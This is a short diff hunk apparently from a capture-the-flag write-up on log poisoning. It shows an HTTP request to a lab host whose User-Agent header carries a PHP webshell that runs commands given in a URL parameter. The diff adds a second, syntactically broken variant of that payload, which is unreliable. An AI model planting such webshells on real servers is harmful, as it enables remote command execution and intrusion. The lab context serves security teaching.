@@ -397,6 +397,7 @@ We’ll modify our user-agent using burp to add a webshell. I always like to add
 
 GET / HTTP/1.1
 Host: 10.10.10.84
+User-Agent: Mozilla/5.0 <?php echo system($_GET ['cmd']; ?> <--  Example Header injection
 User-Agent: 0xdf: <?php system($_GET['c']); ?>
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
